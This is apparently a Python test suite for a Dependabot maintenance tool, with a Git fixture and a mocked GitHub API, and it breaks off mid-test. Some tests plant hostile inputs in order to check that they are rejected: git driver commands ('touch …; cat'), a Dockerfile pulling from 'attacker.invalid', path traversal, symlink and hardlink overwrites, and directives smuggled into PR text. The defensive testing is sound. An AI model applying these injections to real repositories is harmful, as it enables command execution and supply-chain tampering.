"""Behavioral native lifecycle tests, with isolated Git remotes and API evidence."""

import base64
import copy
from contextlib import contextmanager
import hashlib
import io
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import json
import os
from pathlib import Path
import re
import subprocess
import sys
import tempfile
import unittest
import threading
from unittest.mock import Mock, patch
from urllib.parse import unquote

import native_dependabot_maintenance as native

REPO = "Azure/ARO-HCP"
PACKAGE = "example.com/library"
OLD = "v1.0.0"
NEW = "v1.1.0"
PIN = "a" * 40
STAMP = "2026-10-01T00:00:00Z"

_policy_api = None


@contextmanager
def mock_api(**kwargs):
    """Bind one fixture mock to both lifecycle calls and the Go evidence bridge."""
    global _policy_api
    mocked = Mock(**kwargs)
    previous = _policy_api
    with patch.object(native, "api", mocked):
        _policy_api = mocked
        try:
            yield mocked
        finally:
            _policy_api = previous


def setUpModule():
    """Keep depctl real while its gh GETs use each test's existing API fixtures."""
    class Handler(BaseHTTPRequestHandler):
        def do_POST(self):
            try:
                callback = _policy_api
                if callback is None:
                    raise ValueError("unmocked native policy network access")
                request = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
                value = callback(request["endpoint"], pages=request["pages"])
                payload = json.dumps(value).encode()
                self.send_response(200)
            except Exception as error:
                payload = str(error).encode()
                self.send_response(500)
            self.end_headers()
            self.wfile.write(payload)

        def log_message(self, *args):
            pass
    server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    unittest.addModuleCleanup(server.server_close)
    unittest.addModuleCleanup(server.shutdown)
    directory = tempfile.TemporaryDirectory()
    unittest.addModuleCleanup(directory.cleanup)
    gh = Path(directory.name) / "gh"
    gh.write_text(f"#!{sys.executable}\nimport json, sys, urllib.request\n"
                  f"url = 'http://127.0.0.1:{server.server_port}'\n"
                  "data = json.dumps({'endpoint': sys.argv[-1], 'pages': '--paginate' in sys.argv}).encode()\n"
                  "print(urllib.request.urlopen(urllib.request.Request(url, data=data)).read().decode())\n")
    gh.chmod(0o700)
    environment = patch.dict(os.environ, {"PATH": directory.name + os.pathsep + os.environ["PATH"]})
    environment.start()
    unittest.addModuleCleanup(environment.stop)


def git(cwd, *args, input=None):
    return subprocess.run(["git", *args], cwd=cwd, input=input,
                          capture_output=True, text=True, check=True).stdout.strip()


def manifest(version):
    return f"module example.com/component\n\ngo 1.26.0\n\nrequire (\n\t{PACKAGE} {version}\n)\n"


def replacement_output(directory, request=None, *, payload=None, nested=False):
    directory = Path(directory)
    agent = directory / "agent"
    agent.mkdir(parents=True, exist_ok=True)
    if payload is None:
        payload = json.dumps(request, ensure_ascii=False, separators=(",", ":")).encode("utf-8")
    (agent / native.REQUEST_FILE).write_bytes(payload)
    arguments = {"request_sha256": hashlib.sha256(payload).hexdigest()}
    item = {"type": "native_replacement", "data": arguments} if nested else {"type": "native_replacement", **arguments}
    path = directory / "agent_output.json"
    path.write_text(json.dumps({"items": [item]}))
    return path






def prepare_request(repo, inventory_file, group_id, title_file, body_file, artifact_dir, *, target, cwd):
    """Exercise the real Go producer against isolated lifecycle fixtures."""
    result = subprocess.run(
        [os.environ["DEPCTL_BINARY"], "dependabot", "native", "prepare-request",
         "--repository", repo, "--repo", str(cwd), "--inventory", str(inventory_file),
         "--group", group_id, "--target", target, "--title-file", str(title_file),
         "--body-file", str(body_file), "--artifact-dir", str(artifact_dir)],
        capture_output=True, text=True,
    )
    if result.returncode:
        raise ValueError(result.stderr.strip())
    return json.loads(result.stdout)


class PolicyBridgeTests(unittest.TestCase):
    def test_unbound_bridge_cannot_call_production_api(self):
        with patch.object(native, "api", side_effect=AssertionError("production API reached")) as production:
            result = subprocess.run(["gh", "api", "repos/actions/checkout/commits/v7.0.1"],
                                    capture_output=True, text=True)
        self.assertNotEqual(result.returncode, 0)
        self.assertEqual(result.stdout, "")
        production.assert_not_called()


class RepositoryFixture(unittest.TestCase):
    """Fake network and shared hold/CI policy; native selection and Git stay real."""

    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name)
        self.remote = self.root / "remote.git"
        self.seed = self.root / "seed"
        self.seed.mkdir()
        git(self.root, "init", "--bare", str(self.remote))
        git(self.seed, "init", "-b", "main")
        git(self.seed, "config", "user.name", "Fixture")
        git(self.seed, "config", "user.email", "fixture@example.test")
        self.write("backend/go.mod", manifest(OLD))
        self.write("internal/go.mod", manifest(OLD))
        self.write("backend/Dockerfile", "FROM example.invalid/base:1.0\n")
        self.write("vendor/example.com/library/library.go", "package library\nconst Version = 1\n")
        self.write("image-sync/oc-mirror/acrauth/vendor/example.com/library/library.go", "package library\nconst Version = 1\n")
        for prefix in native.VENDORS:
            self.write(prefix + "modules.txt", f"# {PACKAGE} {OLD}\n## explicit; go 1.26.0\n{PACKAGE}\n")
        self.write("api/package.json", json.dumps({"devDependencies": {"prettier": "3.9.9"},
                                                  "overrides": {"undici": "7.30.1"}}, indent=2) + "\n")
        self.write("api/Makefile", "models:\n\t@echo generated\n")
        self.write(".github/workflows/ci.yml", "name: CI\njobs:\n  test:\n    steps:\n      - uses: actions/checkout@" + "b" * 40 + "\n      - run: echo safe\n")
        git(self.seed, "add", ".")
        git(self.seed, "commit", "-m", "base")
        self.base = git(self.seed, "rev-parse", "HEAD")
        git(self.seed, "remote", "add", "origin", str(self.remote))
        git(self.seed, "push", "origin", "main")
        self.pulls = {}
        self.comments = {}
        self.events = {}
        self.statuses = {}
        self.checks = {}
        self.policy = {}
        real_run = subprocess.run

        def run(command, **kwargs):
            if command[1:] == ["maintenance", "snapshot-evidence"]:
                evidence = json.loads(kwargs["input"])
                result = self.policy.get(evidence["head"], {
                    "active_holds": [], "cancellation_pending": False,
                    "trusted_hold_label": False, "ci": {"positive": [], "blocked": []}})
                return subprocess.CompletedProcess(command, 0, json.dumps(result), "")
            return real_run(command, **kwargs)

        process_patch = patch.object(native.subprocess, "run", side_effect=run)
        process_patch.start()
        self.addCleanup(process_patch.stop)
        self.calls = []
        self.next_number = 100
        self.source(1, "backend/go.mod", manifest(NEW))
        api_context = mock_api(side_effect=self.api)
        api_context.__enter__()
        self.addCleanup(api_context.__exit__, None, None, None)

    def write(self, path, text):
        target = self.seed / path
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(text)

    def remote_git(self, *args):
        return git(self.root, "--git-dir", str(self.remote), *args)

    def source(self, number, path, text):
        git(self.seed, "switch", "main")
        git(self.seed, "switch", "-c", f"dependabot/fixture-{number}")
        self.write(path, text)
        git(self.seed, "add", ".")
        git(self.seed, "commit", "-m", "native upgrade")
        sha = git(self.seed, "rev-parse", "HEAD")
        git(self.seed, "push", "origin", f"dependabot/fixture-{number}")
        self.pulls[number] = {"number": number, "state": "open", "merged": False, "draft": False,
                              "title": "Untrusted native title", "body": "Native proposal", "labels": [],
                              "user": {"login": native.NATIVE, "type": "Bot"},
                              "head": {"sha": sha, "ref": f"dependabot/fixture-{number}", "repo": {"full_name": REPO}},
                              "base": {"sha": self.base, "ref": "main", "repo": {"full_name": REPO}}}
        self.comments[number] = []
        self.events[number] = []
        git(self.seed, "switch", "main")
        return sha

    def detail(self, number):
        pull = copy.deepcopy(self.pulls[number])
        if pull["state"] == "open":
            pull["head"]["sha"] = self.remote_git("rev-parse", "refs/heads/" + pull["head"]["ref"])
        pull["base"]["sha"] = self.remote_git("rev-parse", "refs/heads/main")
        base = self.remote_git("merge-base", pull["base"]["sha"], pull["head"]["sha"])
        pull["commits"] = len(self.remote_git("rev-list", f"{base}..{pull['head']['sha']}").splitlines())
        pull["changed_files"] = len(self.files(number))
        pull["comments"] = len(self.comments[number])
        pull["html_url"] = f"https://github.com/{REPO}/pull/{number}"
        return pull

    def files(self, number):
        pull = self.pulls[number]
        head = self.remote_git("rev-parse", "refs/heads/" + pull["head"]["ref"])
        base = self.remote_git("merge-base", "refs/heads/main", head)
        result = []
        for line in self.remote_git("diff", "--name-status", base, head).splitlines():
            state, path = line.split("\t")
            result.append({"filename": path, "status": {"M": "modified", "A": "added", "D": "removed"}[state]})
        return result

    def api(self, endpoint, *, pages=False, method=None, data=None, ci=False):
        self.calls.append((endpoint, method, copy.deepcopy(data)))
        if endpoint == "users/aro-hcp-robot%5Bbot%5D":
            return {"login": native.ROBOT, "type": "Bot", "id": 42}
        prefix = f"repos/{REPO}/"
        if not endpoint.startswith(prefix):
            if "/git/commits/" in endpoint:
                return {"sha": endpoint.rsplit("/", 1)[1]}
            if "/tags?" in endpoint:
                return [[{"name": "v1.2.3", "commit": {"sha": PIN}}]]
            self.fail("unexpected foreign API call " + endpoint)
        path = endpoint[len(prefix):]
        if path == "git/ref/heads/main":
            return {"object": {"sha": self.remote_git("rev-parse", "refs/heads/main")}}
        if path.startswith("git/trees/"):
            sha = path.split("/")[2].split("?")[0]
            tree = []
            for line in self.remote_git("ls-tree", sha).splitlines():
                mode, kind, rest = line.split(" ", 2)
                entry_sha, filename = rest.split("\t", 1)
                tree.append({"mode": mode, "type": kind, "path": filename, "sha": entry_sha})
            return {"truncated": False, "tree": tree}
        if path.startswith("contents/"):
            filename, sha = path[len("contents/"):].split("?ref=")
            value = self.remote_git("show", f"{sha}:{unquote(filename)}").encode()
            return {"type": "file", "encoding": "base64", "content": base64.b64encode(value).decode(), "size": len(value)}
        if path.startswith("compare/"):
            left, right = path[len("compare/"):].split("...")
            base = self.remote_git("merge-base", left, right)
            return {"merge_base_commit": {"sha": base}, "status": "identical" if left == right else "ahead" if base == left else "diverged"}
        if path.startswith("issues?state="):
            creator = unquote(path.split("creator=")[1].split("&")[0])
            state = path.split("state=")[1].split("&")[0]
            values = [{"number": number, "state": pull["state"], "user": pull["user"], "pull_request": {},
                       "body": pull["body"], "labels": pull["labels"]}
                      for number, pull in self.pulls.items() if pull["user"]["login"] == creator
                      and (state == "all" or pull["state"] == state)]
            return [values[:1], values[1:]] if pages else values
        if path.startswith("pulls/"):
            parts = path.split("/")
            number = int(parts[1])
            if len(parts) == 2:
                return self.detail(number)
            if parts[2].startswith("files"):
                return [self.files(number)]
            if parts[2].startswith("commits"):
                pull = self.detail(number)
                base = self.remote_git("merge-base", pull["base"]["sha"], pull["head"]["sha"])
                return [[{"sha": sha, "author": {"login": pull["user"]["login"], "type": "Bot"}}
                         for sha in self.remote_git("rev-list", f"{base}..{pull['head']['sha']}").splitlines()]]
        if path.startswith("issues/"):
            number = int(path.split("/")[1])
            if "/comments" in path:
                if method == "POST":
                    comment = {"id": len(self.comments[number]) + 1, "body": data["body"],
                               "user": {"login": native.ROBOT}, "created_at": STAMP, "updated_at": STAMP}
                    self.comments[number].append(comment)
                    return copy.deepcopy(comment)
                return [copy.deepcopy(self.comments[number])]
            if "/events" in path:
                return [copy.deepcopy(self.events[number])]
        if path.startswith("commits/"):
            sha = path.split("/")[1]
            if "/statuses" in path:
                return [copy.deepcopy(self.statuses.get(sha, []))]
            if "/check-runs" in path:
                checks = self.checks.get(sha, [])
                return [{"total_count": len(checks), "check_runs": copy.deepcopy(checks)}]
            return {"sha": sha, "author": {"login": native.ROBOT, "type": "Bot"}}
        self.fail("unexpected API call " + endpoint)

    def upgrade_consumers(self):
        self.write("backend/go.mod", manifest(NEW))
        self.write("internal/go.mod", manifest(NEW))
        for prefix in native.VENDORS:
            self.write(prefix + "modules.txt", f"# {PACKAGE} {NEW}\n## explicit; go 1.26.0\n{PACKAGE}\n")


    def request(self):
        self.upgrade_consumers()
        value = {"source_prs": [{"number": 1, "head_sha": self.pulls[1]["head"]["sha"]}],
                 "expected_base_sha": self.base, "patch": git(self.seed, "diff") + "\n",
                 "title": "chore(deps): upgrade example library (AROSLSRE-2670)",
                 "body": "Regenerated dependency consumers. Source PR #1."}
        git(self.seed, "restore", ".")
        return value

    def replacement_fixture(self, request=None):
        """Arrange an owned robot PR for inventory/reconciliation, not a publication operation."""
        request = self.request() if request is None else request
        group = hashlib.sha256(f"go:{PACKAGE}".encode()).hexdigest()[:24]
        branch = "native-dependabot-" + group
        marker = "<!-- " + native.MARKER + json.dumps(
            {"group": group, "sources": request["source_prs"]}, sort_keys=True) + " -->"
        git(self.seed, "switch", "-C", branch, "main")
        git(self.seed, "apply", "-", input=request["patch"])
        git(self.seed, "add", ".")
        git(self.seed, "commit", "-m", request["title"] + "\n\n" + marker)
        sha = git(self.seed, "rev-parse", "HEAD")
        git(self.seed, "push", "origin", branch)
        git(self.seed, "switch", "main")
        number = self.next_number
        self.next_number += 1
        self.pulls[number] = {
            "number": number, "state": "open", "merged": False, "draft": False,
            "title": request["title"], "body": request["body"] + "\n\n" + marker,
            "labels": [{"name": native.LABEL}], "user": {"login": native.ROBOT, "type": "Bot"},
            "head": {"sha": sha, "ref": branch, "repo": {"full_name": REPO}},
            "base": {"sha": request["expected_base_sha"], "ref": "main", "repo": {"full_name": REPO}},
        }
        self.comments[number], self.events[number] = [], []
        return {"number": number, "head_sha": sha, "group": group}



    def prepare_inputs(self, observed=None):
        observed = native.inventory(REPO) if observed is None else observed
        inventory = self.root / "inventory.json"
        title = self.root / "title.txt"
        body = self.root / "body.txt"
        inventory.write_text(json.dumps(observed))
        title.write_text("chore(deps): upgrade example library")
        body.write_text("Regenerated all consumers.\nSource evidence: café.\n")
        group = next(group for group in observed["groups"] if group.get("ecosystem") == "go")
        return inventory, group["group"], title, body


    def test_prepare_request_returns_digest_for_exact_payload_and_normalizes_title_newline(self):
        inputs = self.prepare_inputs()
        inputs[2].write_text("chore(deps): upgrade example library\n")
        self.upgrade_consumers()
        artifact_root = self.root / "artifacts"
        arguments = prepare_request(REPO, *inputs, artifact_root / "agent", target=NEW, cwd=self.seed)
        self.assertEqual(set(arguments), {"request_sha256"})
        payload = (artifact_root / "agent" / native.REQUEST_FILE).read_bytes()
        self.assertEqual(arguments["request_sha256"], hashlib.sha256(payload).hexdigest())
        self.assertEqual(json.loads(payload)["expected_base_sha"], self.base)
        self.assertEqual(json.loads(payload)["title"], "chore(deps): upgrade example library")

    def test_removed_prepare_request_cli_cannot_emit_unvalidated_request(self):
        inputs = self.prepare_inputs()
        self.upgrade_consumers()
        artifact_root = self.root / "artifacts"
        command = [sys.executable, str(Path(native.__file__).resolve()), "prepare-request", REPO,
                   *map(str, inputs), str(artifact_root / "agent")]
        result = subprocess.run(command, cwd=self.seed, capture_output=True, text=True)
        self.assertNotEqual(result.returncode, 0)
        self.assertEqual(result.stdout, "")
        self.assertFalse(artifact_root.exists())

    def test_detection_cli_stages_full_patch_and_exact_nonnotifying_publication_metadata(self):
        request = self.request()
        self.upgrade_consumers()
        vendored = ("package library\n// @Azure/reviewers and @scope/package stay literal in code\n"
                    "// full detector payload: " + "x" * 70000 + "\n")
        for prefix in native.VENDORS:
            self.write(prefix + "example.com/library/library.go", vendored)
        request["patch"] = git(self.seed, "diff") + "\n"
        git(self.seed, "restore", ".")
        request["title"] = "chore(deps): @user @Azure/reviewers @scope/package"
        request["body"] = (
            "Upgrade @scope/package; evidence from @user and @Azure/reviewers.\n"
            "Inline `@Azure/reviewers`, escaped \\`@Azure/reviewers\\`, and \\@user.\n"
            "```text\n@Azure/reviewers\n```\n"
            "````\n``` @Azure/reviewers\n````\n"
            "Trailing Unicode evidence: café 🦉.\n")
        output = replacement_output(self.root / "transport", request)
        artifact = output.parent / "agent" / native.REQUEST_FILE
        original_output, original_payload = output.read_bytes(), artifact.read_bytes()
        detection = self.root / "detection"
        detection.mkdir()
        detector_output = detection / "agent_output.json"
        detector_output.write_bytes(original_output)
        self.calls.clear()
        command = [sys.executable, str(Path(native.__file__).resolve()), "stage-detection", REPO,
                   str(output), str(detection)]
        staged = subprocess.run(command, cwd=self.seed, capture_output=True, text=True, check=True)
        self.assertEqual(json.loads(staged.stdout),
                         {"status": "staged", "patch": "aw-native-replacement.patch"})
        self.assertEqual(staged.stderr, "")
        self.assertEqual(self.calls, [])
        patch_bytes = (detection / "aw-native-replacement.patch").read_bytes()
        self.assertGreater(len(patch_bytes), 65536)
        self.assertEqual(patch_bytes, request["patch"].encode("utf-8"))
        self.assertIn(b"@Azure/reviewers", patch_bytes)
        scanned = json.loads(detector_output.read_text())["items"][0]
        expected_title = request["title"].replace("@", "\uff20")
        expected_body = request["body"].replace("@", "\uff20")
        self.assertEqual(scanned["title"], expected_title)
        self.assertEqual(scanned["body"], expected_body)
        self.assertEqual(scanned["source_prs"], request["source_prs"])
        self.assertEqual(scanned["expected_base_sha"], self.base)
        self.assertEqual(scanned["request_sha256"], hashlib.sha256(original_payload).hexdigest())
        self.assertNotIn("patch", scanned)
        self.assertEqual(output.read_bytes(), original_output)
        self.assertEqual(artifact.read_bytes(), original_payload)
        verified = native.read_request(output, "native_replacement")
        self.assertEqual(verified, request)

    def test_prepare_request_does_not_execute_git_drivers(self):
        inputs = self.prepare_inputs()
        self.upgrade_consumers()
        sentinel = self.root / "executed"
        command = f"touch {sentinel}; cat"
        git(self.seed, "config", "diff.fixture.command", command)
        git(self.seed, "config", "diff.fixture.textconv", command)
        git(self.seed, "config", "filter.fixture.clean", command)
        git(self.seed, "config", "filter.fixture.process", command)
        (self.seed / ".git/info/attributes").write_text("*.mod diff=fixture filter=fixture\n")
        self.calls.clear()
        arguments = prepare_request(REPO, *inputs, self.root / "artifacts", target=NEW, cwd=self.seed)
        self.assertRegex(arguments["request_sha256"], r"^[0-9a-f]{64}$")
        self.assertFalse(sentinel.exists())
        self.assertEqual(self.calls, [])

    def test_prepare_request_uses_real_depctl_to_reject_invalid_source_intent_before_writes(self):
        observed = native.inventory(REPO)
        observed["groups"][0]["sources"][0]["intents"][0]["lock_manifests"] = ["../outside"]
        inputs = self.prepare_inputs(observed)
        self.upgrade_consumers()
        artifact_root = self.root / "rejected"
        before_index = (self.seed / ".git/index").read_bytes()
        self.calls.clear()
        with self.assertRaises(ValueError):
            prepare_request(REPO, *inputs, artifact_root, target=NEW, cwd=self.seed)
        self.assertFalse(artifact_root.exists())
        self.assertEqual((self.seed / ".git/index").read_bytes(), before_index)
        self.assertEqual(self.calls, [])

    def test_prepare_request_maintains_existing_group_and_rejects_empty_or_protected_diff(self):
        self.replacement_fixture()
        inputs = self.prepare_inputs()
        self.assertEqual(json.loads(inputs[0].read_text())["groups"][0]["next_action"]["action"],
                         "maintain_replacement")
        with self.assertRaises(ValueError):
            prepare_request(REPO, *inputs, self.root / "empty", target=NEW, cwd=self.seed)
        self.upgrade_consumers()
        self.write("backend/Dockerfile", "FROM attacker.invalid/image:1\n")
        with self.assertRaisesRegex(ValueError, "protected"):
            prepare_request(REPO, *inputs, self.root / "protected", target=NEW, cwd=self.seed)
        git(self.seed, "restore", "backend/Dockerfile")
        result = prepare_request(REPO, *inputs, self.root / "valid", target=NEW, cwd=self.seed)
        self.assertRegex(result["request_sha256"], r"^[0-9a-f]{64}$")

    def test_prepare_request_rejects_invalid_metadata_before_writing_artifact(self):
        inputs = self.prepare_inputs()
        self.upgrade_consumers()
        for path, content in ((inputs[2], b""), (inputs[2], b"chore(deps): title\nsecond line"),
                              (inputs[3], b""), (inputs[3], b"Unsafe\n/retest"),
                              (inputs[3], b"\xff")):
            originals = [inputs[2].read_bytes(), inputs[3].read_bytes()]
            path.write_bytes(content)
            artifact_root = self.root / "rejected"
            with self.subTest(content=content), self.assertRaises(ValueError):
                prepare_request(REPO, *inputs, artifact_root, target=NEW, cwd=self.seed)
            self.assertFalse(artifact_root.exists())
            inputs[2].write_bytes(originals[0])
            inputs[3].write_bytes(originals[1])

    def test_preparation_and_publisher_agree_on_unicode_decimal_directives(self):
        inputs = self.prepare_inputs()
        request = self.request()
        git(self.seed, "apply", "-", input=request["patch"])
        cases = (("Fixes #12", False), ("Fixes #١٢", False),
                 ("Resolves #१२", False), ("Closes #１２", False),
                 ("Fixes #𝟙𝟚", False), ("Fixes #1٢", False),
                 ("Fixes #²", True), ("prefixFixes #١٢", True),
                 ("Update issue #١٢", True))
        for field in ("title", "body"):
            for index, (text, accepted) in enumerate(cases):
                candidate = {**request, field: "chore(deps): " + text if field == "title" else text}
                inputs[2].write_text(candidate["title"], encoding="utf-8")
                inputs[3].write_text(candidate["body"], encoding="utf-8")
                artifacts = self.root / "parity" / field / str(index)
                with self.subTest(field=field, text=text):
                    if accepted:
                        prepare_request(REPO, *inputs, artifacts, target=NEW, cwd=self.seed)
                        prepared = json.loads((artifacts / native.REQUEST_FILE).read_bytes())
                        native.validate_replacement_request(prepared)
                        self.assertEqual(prepared[field], candidate[field])
                    else:
                        with self.assertRaises(ValueError):
                            native.validate_replacement_request(candidate)
                        with self.assertRaises(ValueError):
                            prepare_request(REPO, *inputs, artifacts, target=NEW, cwd=self.seed)
                        self.assertFalse(artifacts.exists())

    def test_prepare_request_normalizes_mentions_without_changing_patch_bytes(self):
        inputs = self.prepare_inputs()
        self.upgrade_consumers()
        inputs[2].write_text("chore(deps): upgrade @scope/package\r\n", encoding="utf-8")
        body = "Evidence: café 🦉 @user\n`@Azure/reviewers` and \\@user\n"
        inputs[3].write_text(body, encoding="utf-8")
        generated = "vendor/example.com/library/library.go"
        self.write(generated, "package library\n// @Azure/reviewers stays literal\n")
        artifact_root = self.root / "artifacts"
        result = prepare_request(REPO, *inputs, artifact_root, target=NEW, cwd=self.seed)
        payload = (artifact_root / native.REQUEST_FILE).read_bytes()
        request = json.loads(payload)
        self.assertEqual(request["title"], "chore(deps): upgrade ＠scope/package")
        self.assertEqual(request["body"], body.replace("@", "＠"))
        self.assertIn("@Azure/reviewers stays literal", request["patch"])
        self.assertEqual(result["request_sha256"], hashlib.sha256(payload).hexdigest())
        self.assertIn("café 🦉".encode("utf-8"), payload)

    def test_prepare_request_rejects_linked_artifact_without_modifying_target(self):
        inputs = self.prepare_inputs()
        self.upgrade_consumers()
        destination = self.root / "artifacts"
        destination.mkdir()
        victim = self.root / "victim"
        victim.write_bytes(b"preserve existing content")
        artifact = destination / native.REQUEST_FILE
        for kind in ("symlink", "hardlink"):
            with self.subTest(kind=kind):
                if kind == "symlink":
                    artifact.symlink_to(victim)
                else:
                    os.link(victim, artifact)
                try:
                    with self.assertRaises(ValueError):
                        prepare_request(REPO, *inputs, destination, target=NEW, cwd=self.seed)
                    self.assertEqual(victim.read_bytes(), b"preserve existing content")
                finally:
                    artifact.unlink()


    def test_invalid_request_shapes_are_rejected_before_any_api_access(self):
        original = self.request()
        invalid = [None, [], "request"]
        for key in original:
            value = copy.deepcopy(original)
            del value[key]
            invalid.append(value)
        for key, values in (
                ("title", (None, False, 1, [], {}, "", " ", "chore(deps): ", "chore(deps): test\rspoof")),
                ("body", (None, False, 1, [], {}, "", " \n", "unsafe\x00body")),
                ("patch", (None, False, 1, [], {}, "", "diff --git a/go.mod b/go.mod\n")),
                ("expected_base_sha", (None, False, 1, [], {}, "a" * 39, "A" * 40)),
                ("source_prs", (None, False, 1, {}, [], [{"number": True, "head_sha": "a" * 40}],
                                [{"number": "1", "head_sha": "a" * 40}],
                                [{"number": 0, "head_sha": "a" * 40}],
                                [{"number": 1, "head_sha": False}],
                                [{"number": 1, "head_sha": "a" * 40, "extra": 1}],
                                [{"number": 1, "head_sha": "a" * 40}] * 2,
                                [{"number": number, "head_sha": "a" * 40} for number in (2, 1)],
                                [{"number": number, "head_sha": "a" * 40} for number in range(1, 102)]))):
            for bad in values:
                value = copy.deepcopy(original)
                value[key] = bad
                invalid.append(value)
        extra = copy.deepcopy(original)
        extra["path"] = "/tmp/arbitrary"
        invalid.append(extra)
        self.calls.clear()
        for index, request in enumerate(invalid):
            with self.subTest(index=index):
                output = replacement_output(self.root / "transport", request)
                with self.assertRaises(ValueError):
                    native.read_request(output, "native_replacement")
        self.assertEqual(self.calls, [])

    def action(self, action, number=1, **kwargs):
        return {"number": number, "expected_head_sha": self.detail(number)["head"]["sha"], "action": action, **kwargs}

    def hold(self, number=1, author="openshift-merge-bot[bot]", body=None):
        sha = self.detail(number)["head"]["sha"]
        kind = "retry-exhaustion" if body is None and author == "openshift-merge-bot[bot]" else "unexplained"
        result = self.policy.setdefault(sha, {
            "active_holds": [], "cancellation_pending": False,
            "trusted_hold_label": False, "ci": {"positive": [], "blocked": []}})
        result["active_holds"] = [{"kind": kind, "author": author}]
        result["trusted_hold_label"] = author == "openshift-merge-bot[bot]"
        body = body or f"/hold\n\nRevision {sha} was retested 3 times: holding"
        self.comments[number].append({"id": 1, "body": body, "user": {"login": author}, "created_at": STAMP, "updated_at": STAMP})
        self.pulls[number]["labels"].append({"name": native.HOLD_LABEL})
        self.events[number].append({"id": 1, "event": "labeled", "label": {"name": native.HOLD_LABEL},
                                    "actor": {"login": author}, "created_at": STAMP})

    def ci(self, number=1, *, green=False, pending=False):
        sha = self.detail(number)["head"]["sha"]
        self.statuses[sha] = [{"id": index + 1, "context": name, "state": "success" if green else "pending" if pending else "failure",
                               "created_at": STAMP, "target_url": "https://prow.ci.openshift.org/view/failed"}
                              for index, name in enumerate(("ci/pipeline-gate", "ci/prow/e2e-parallel"))]
        result = self.policy.setdefault(sha, {
            "active_holds": [], "cancellation_pending": False,
            "trusted_hold_label": False, "ci": {"positive": [], "blocked": []}})
        result["ci"] = {
            "positive": ["ci/pipeline-gate", "ci/prow/e2e-parallel"] if green else [],
            "blocked": [] if green else [
                {"name": row["context"], "state": row["state"],
                 "url": row["target_url"], "pending": pending} for row in self.statuses[sha]],
        }

    def merge_replacement(self, number):
        branch = self.pulls[number]["head"]["ref"]
        git(self.seed, "fetch", "origin", branch)
        git(self.seed, "merge", "--ff-only", "FETCH_HEAD")
        git(self.seed, "push", "origin", "main")
        self.pulls[number]["head"]["sha"] = git(self.seed, "rev-parse", "HEAD")
        self.pulls[number].update({"state": "closed", "merged": True,
                                   "merge_commit_sha": git(self.seed, "rev-parse", "HEAD")})

    def test_inventory_groups_same_family_across_modules_and_paginates(self):
        self.source(2, "internal/go.mod", manifest(NEW))
        result = native.inventory(REPO)
        self.assertEqual(len(result["groups"]), 1)
        self.assertEqual([row["number"] for row in result["groups"][0]["sources"]], [1, 2])
        self.assertEqual(result["groups"][0]["blockers"], [])
        self.assertEqual(result["groups"][0]["next_action"]["action"], "prepare_replacement")
        endpoints = [endpoint for endpoint, _, _ in self.calls if "issues?" in endpoint]
        self.assertTrue(all("creator=" in endpoint for endpoint in endpoints))
        self.assertTrue(any("state=all" in endpoint for endpoint in endpoints))

    def test_native_ci_is_evidence_not_replacement_preparation_gate(self):
        sha = self.detail(1)["head"]["sha"]
        for state in ("awaiting-admission", "pending", "queued", "in_progress", "failed"):
            with self.subTest(state=state):
                self.statuses.clear()
                self.checks.clear()
                self.pulls[1]["labels"] = [{"name": "needs-ok-to-test"}] if state == "awaiting-admission" else []
                if state in ("pending", "failed"):
                    self.ci(pending=state == "pending")
                elif state in ("queued", "in_progress"):
                    self.checks[sha] = [{"id": 1, "name": "ci/prow/e2e-parallel",
                                         "head_sha": sha, "status": state, "conclusion": None}]
                group = native.inventory(REPO)["groups"][0]
                self.assertEqual(group["next_action"]["action"], "prepare_replacement")

    def test_inventory_preserves_human_hold_before_preparation(self):
        self.hold(author="human", body="/hold\nInvestigating dependency compatibility")
        group = native.inventory(REPO)["groups"][0]
        self.assertEqual(group["next_action"]["action"], "blocked")
        self.assertIn("human/unknown hold", group["next_action"]["reason"])

    def test_inventory_selects_existing_pending_robot_replacement(self):
        published = self.replacement_fixture()
        self.ci(number=published["number"], pending=True)
        group = native.inventory(REPO)["groups"][0]
        self.assertEqual(group["next_action"]["action"], "maintain_replacement")
        self.assertEqual(group["next_action"]["replacement_pr"], published["number"])

    def test_inventory_blocks_human_hold_on_existing_replacement(self):
        published = self.replacement_fixture()
        self.hold(number=published["number"], author="human", body="/hold\nInvestigating")
        group = native.inventory(REPO)["groups"][0]
        self.assertEqual(group["next_action"]["action"], "blocked")
        self.assertEqual(group["next_action"]["replacement_pr"], published["number"])

    def test_cleanup_selection_requires_exact_source_head(self):
        group = {"group": "a" * 24, "blockers": [],
                 "sources": [{"number": 1, "head_sha": "b" * 40}]}
        replacement = {"number": 100, "group": group["group"], "merged": True,
                       "sources": copy.deepcopy(group["sources"])}
        action = native.next_action(group, [replacement])
        self.assertEqual(action["action"], "close_superseded")
        self.assertEqual(action["source_prs"], group["sources"])
        replacement["sources"][0]["head_sha"] = "c" * 40
        self.assertEqual(native.next_action(group, [replacement])["action"], "prepare_replacement")
        replacement["sources"] = [{"number": 2, "head_sha": "b" * 40}]
        self.assertEqual(native.next_action(group, [replacement])["action"], "prepare_replacement")

    def test_cleanup_selection_maps_subset_without_changing_publication_sources(self):
        group = {"group": "a" * 24, "blockers": [],
                 "sources": [{"number": 1, "head_sha": "b" * 40},
                             {"number": 2, "head_sha": "c" * 40}]}
        replacement = {"number": 100, "group": group["group"], "merged": True,
                       "sources": [copy.deepcopy(group["sources"][0])]}
        complete_sources = copy.deepcopy(group["sources"])
        action = native.next_action(group, [replacement])
        self.assertEqual(action["action"], "close_superseded")
        self.assertEqual(action["source_prs"], [complete_sources[0]])
        self.assertEqual(group["sources"], complete_sources)

    def test_cleanup_selection_excludes_rebased_source_from_subset(self):
        group = {"group": "a" * 24, "blockers": [],
                 "sources": [{"number": 1, "head_sha": "b" * 40},
                             {"number": 2, "head_sha": "c" * 40}]}
        replacement = {"number": 100, "group": group["group"], "merged": True,
                       "sources": [{"number": 1, "head_sha": "d" * 40},
                                   copy.deepcopy(group["sources"][1])]}
        action = native.next_action(group, [replacement])
        self.assertEqual(action["action"], "close_superseded")
        self.assertEqual(action["source_prs"], [group["sources"][1]])

    def test_cleanup_selection_uses_one_exact_merged_history_mapping(self):
        group = {"group": "a" * 24, "blockers": [],
                 "sources": [{"number": 1, "head_sha": "b" * 40},
                             {"number": 2, "head_sha": "c" * 40}]}
